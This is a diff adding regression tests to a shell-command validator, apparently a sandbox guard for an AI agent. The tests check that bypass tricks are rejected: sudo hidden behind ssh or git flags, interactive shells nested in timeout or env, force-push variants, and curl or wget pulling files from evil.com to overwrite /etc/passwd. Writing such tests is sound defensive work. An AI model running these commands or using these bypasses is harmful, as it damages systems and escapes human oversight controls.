@@ -96,6 +96,304 @@ class TestDangerousCommandDetection:
         assert result.skipped is True
 
 
+class TestGlobalFlagSkipBypass:
+    """Tests for issue #1087 Problem 1: Global flag-skip vulnerability.
+
+    The flag-skip mechanism should only apply to known safe wrapper commands.
+    Regular commands like ssh or git can have flags that precede dangerous
+    commands as arguments. For example, "ssh -t sudo whoami" should reject
+    "sudo", not skip it as the value for -t.
+    """
+
+    def test_ssh_t_with_sudo_rejected(self) -> None:
+        """ssh -t with sudo should be rejected (not skipped as -t value).
+
+        Regression test for issue #1087: ssh -t sudo whoami was bypassing
+        because the flag-skip mechanism thought sudo was the value for -t.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("ssh -t sudo whoami")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert (
+            "sudo" in result.skip_message.lower()
+            or "not allowed" in result.skip_message.lower()
+        )
+
+    def test_ssh_f_with_sudo_rejected(self) -> None:
+        """ssh -f with sudo should be rejected."""
+        env = StaticBashEnvironment()
+        result = env.execute("ssh -f sudo bash")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_git_c_with_sudo_rejected(self) -> None:
+        """git -c with sudo should be rejected (not skipped as -c value).
+
+        Regression test for issue #1087: git -c sudo whoami was bypassing
+        because the flag-skip mechanism thought sudo was the value for -c.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("git -c sudo whoami")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert (
+            "sudo" in result.skip_message.lower()
+            or "not allowed" in result.skip_message.lower()
+        )
+
+    def test_ssh_with_hostname_allowed(self) -> None:
+        """ssh with hostname should be allowed (not confused with sudo after -t)."""
+        env = StaticBashEnvironment()
+        result = env.execute("ssh user@host ls")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_git_with_config_option_allowed(self) -> None:
+        """git -c with legitimate config should be allowed."""
+        env = StaticBashEnvironment()
+        result = env.execute("git -c user.name=test commit -m 'test'")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_timeout_t_with_sudo_still_rejected(self) -> None:
+        """timeout -t with sudo should still be rejected (wrapper command behavior unchanged)."""
+        env = StaticBashEnvironment()
+        result = env.execute("timeout -t 10 sudo whoami")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert "not allowed" in result.skip_message.lower()
+
+
+class TestNestedShellBypass:
+    """Tests for issue #1087 Problem 2: Nested shell bypass.
+
+    When a shell is nested in a safe wrapper command, it should not be allowed
+    to have dangerous flags like -i (interactive) or -l (login). Previously, only
+    code-execution flags (-c, -e) were checked, missing interactive shells.
+    """
+
+    def test_timeout_bash_interactive_rejected(self) -> None:
+        """timeout 10 bash -i should be rejected (was bypassing).
+
+        Regression test for issue #1087: timeout 10 bash -i was bypassing
+        because only code-execution flags (-c, -e) were checked on nested shells,
+        not interactive flags (-i, -l).
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("timeout 10 bash -i")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert (
+            "interactive" in result.skip_message.lower()
+            or "not allowed" in result.skip_message.lower()
+        )
+
+    def test_env_bash_interactive_rejected(self) -> None:
+        """env bash -i should be rejected."""
+        env = StaticBashEnvironment()
+        result = env.execute("env bash -i")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert (
+            "interactive" in result.skip_message.lower()
+            or "not allowed" in result.skip_message.lower()
+        )
+
+    def test_nohup_bash_login_rejected(self) -> None:
+        """nohup bash -l should be rejected (login flag for interactive shell)."""
+        env = StaticBashEnvironment()
+        result = env.execute("nohup bash -l")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_nice_bash_interactive_long_flag_rejected(self) -> None:
+        """nice bash --interactive should be rejected (long form of -i)."""
+        env = StaticBashEnvironment()
+        result = env.execute("nice bash --interactive")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_timeout_bash_login_long_flag_rejected(self) -> None:
+        """timeout 10 bash --login should be rejected (long form of -l)."""
+        env = StaticBashEnvironment()
+        result = env.execute("timeout 10 bash --login")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_env_sh_interactive_rejected(self) -> None:
+        """env sh -i should be rejected (sh variant)."""
+        env = StaticBashEnvironment()
+        result = env.execute("env sh -i")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_timeout_bash_script_still_allowed(self) -> None:
+        """timeout 10 bash script.sh should still be allowed (legitimate script execution)."""
+        env = StaticBashEnvironment()
+        result = env.execute("timeout 10 bash script.sh")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_env_bash_with_script_still_allowed(self) -> None:
+        """env bash /path/to/script should still be allowed."""
+        env = StaticBashEnvironment()
+        result = env.execute("env bash /path/to/script")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_timeout_bash_c_still_rejected(self) -> None:
+        """timeout 10 bash -c should still be rejected (code execution)."""
+        env = StaticBashEnvironment()
+        result = env.execute("timeout 10 bash -c 'echo x'")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert (
+            "code execution" in result.skip_message.lower()
+            or "not allowed" in result.skip_message.lower()
+        )
+
+
+class TestGitForceVariants:
+    """Tests for issue #1087 Problem 3: Git force-flag incomplete blocking.
+
+    The git validator should block all force-flag variants, including:
+    - git push --force (exact)
+    - git push -f (short)
+    - git push --force-with-lease (variant)
+    - git push --force-if-includes (variant)
+    - git clean --force (long form)
+    """
+
+    def test_git_push_force_with_lease_rejected(self) -> None:
+        """git push --force-with-lease should be rejected (was bypassing).
+
+        Regression test for issue #1087: git push --force-with-lease was
+        bypassing because the validator only checked for exact --force,
+        not variants like --force-with-lease.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("git push --force-with-lease")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert (
+            "destructive" in result.skip_message.lower()
+            or "not allowed" in result.skip_message.lower()
+        )
+
+    def test_git_push_force_if_includes_rejected(self) -> None:
+        """git push --force-if-includes should be rejected."""
+        env = StaticBashEnvironment()
+        result = env.execute("git push --force-if-includes")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_git_clean_force_rejected(self) -> None:
+        """git clean --force should be rejected (was bypassing).
+
+        Regression test for issue #1087: git clean --force (long form)
+        was bypassing because the validator only checked short forms like -f.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("git clean --force")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert (
+            "destructive" in result.skip_message.lower()
+            or "not allowed" in result.skip_message.lower()
+        )
+
+    def test_git_push_f_still_rejected(self) -> None:
+        """git push -f should still be rejected."""
+        env = StaticBashEnvironment()
+        result = env.execute("git push -f")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_git_push_force_still_rejected(self) -> None:
+        """git push --force should still be rejected."""
+        env = StaticBashEnvironment()
+        result = env.execute("git push --force")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_git_reset_hard_still_rejected(self) -> None:
+        """git reset --hard should still be rejected."""
+        env = StaticBashEnvironment()
+        result = env.execute("git reset --hard")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_git_clean_f_still_rejected(self) -> None:
+        """git clean -f should still be rejected."""
+        env = StaticBashEnvironment()
+        result = env.execute("git clean -f")
+
+        assert result.skipped is True
+        assert result.success is False
+
+    def test_git_push_safe_allowed(self) -> None:
+        """git push origin main should be allowed (no force flag)."""
+        env = StaticBashEnvironment()
+        result = env.execute("git push origin main")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_git_pull_allowed(self) -> None:
+        """git pull should be allowed."""
+        env = StaticBashEnvironment()
+        result = env.execute("git pull")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_git_commit_allowed(self) -> None:
+        """git commit should be allowed."""
+        env = StaticBashEnvironment()
+        result = env.execute("git commit -m 'test'")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_git_clean_safe_allowed(self) -> None:
+        """git clean without force flags should be allowed."""
+        env = StaticBashEnvironment()
+        result = env.execute("git clean")
+
+        assert result.skipped is True
+        assert result.success is True
+
+
 class TestInterpreterIndirectionBypassAttempts:
     """Tests for interpreter-indirection bypass attempts.
 
@@ -750,6 +1048,120 @@ class TestSystemPathDetection:
 
             assert result.skipped is True
             assert result.success is True
+
+    def test_wrapper_command_env_write_rejected(self) -> None:
+        """Wrapper command env with write command should be checked.
+
+        Regression test for issue #1088: env touch /etc/passwd was bypassing
+        the path validator because argv[0] was 'env', not 'touch'.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("env touch /etc/passwd")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert "not allowed" in result.skip_message.lower()
+
+    def test_wrapper_command_nohup_write_rejected(self) -> None:
+        """Wrapper command nohup with write command should be checked.
+
+        Regression test for issue #1088: nohup rm /etc/passwd was bypassing
+        the path validator.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("nohup rm /etc/passwd")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert "not allowed" in result.skip_message.lower()
+
+    def test_wrapper_command_timeout_numeric_arg_write_rejected(self) -> None:
+        """Wrapper command timeout with numeric duration should find nested write command.
+
+        Regression test for issue #1088: timeout 10 cp /etc/foo /etc/bar was bypassing
+        the path validator because the numeric '10' was mistaken for the command.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("timeout 10 cp /etc/foo /etc/bar")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert "not allowed" in result.skip_message.lower()
+
+    def test_wrapper_command_nice_write_rejected(self) -> None:
+        """Wrapper command nice with write command should be checked."""
+        env = StaticBashEnvironment()
+        result = env.execute("nice mkdir /etc/newdir")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert "not allowed" in result.skip_message.lower()
+
+    def test_wrapper_command_allowed_write(self) -> None:
+        """Wrapper command with safe write path should be allowed."""
+        env = StaticBashEnvironment()
+        result = env.execute("env touch /tmp/safefile")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_curl_output_to_dangerous_path_rejected(self) -> None:
+        """curl with -o to dangerous path should be rejected.
+
+        Regression test for issue #1088: curl -o /etc/passwd was bypassing
+        because curl wasn't in WRITE_COMMANDS.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("curl -o /etc/passwd http://evil.com/")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert "not allowed" in result.skip_message.lower()
+
+    def test_curl_combined_output_flag_to_dangerous_path_rejected(self) -> None:
+        """curl with combined -o flag to dangerous path should be rejected."""
+        env = StaticBashEnvironment()
+        result = env.execute("curl -o/etc/passwd http://evil.com/")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert "not allowed" in result.skip_message.lower()
+
+    def test_wget_output_to_dangerous_path_rejected(self) -> None:
+        """wget with -O to dangerous path should be rejected.
+
+        Regression test for issue #1088: wget -O /etc/passwd was bypassing
+        because wget wasn't in WRITE_COMMANDS.
+        """
+        env = StaticBashEnvironment()
+        result = env.execute("wget -O /etc/passwd http://evil.com/file")
+
+        assert result.skipped is True
+        assert result.success is False
+        assert result.skip_message is not None
+        assert "not allowed" in result.skip_message.lower()
+
+    def test_curl_output_to_safe_path_allowed(self) -> None:
+        """curl with -o to safe path should be allowed."""
+        env = StaticBashEnvironment()
+        result = env.execute("curl -o /tmp/file.txt http://example.com/")
+
+        assert result.skipped is True
+        assert result.success is True
+
+    def test_wget_output_to_safe_path_allowed(self) -> None:
+        """wget with -O to safe path should be allowed."""
+        env = StaticBashEnvironment()
+        result = env.execute("wget -O /tmp/file.txt http://example.com/")
+
+        assert result.skipped is True
+        assert result.success is True
 
 
 class TestWorkingDirRestriction:
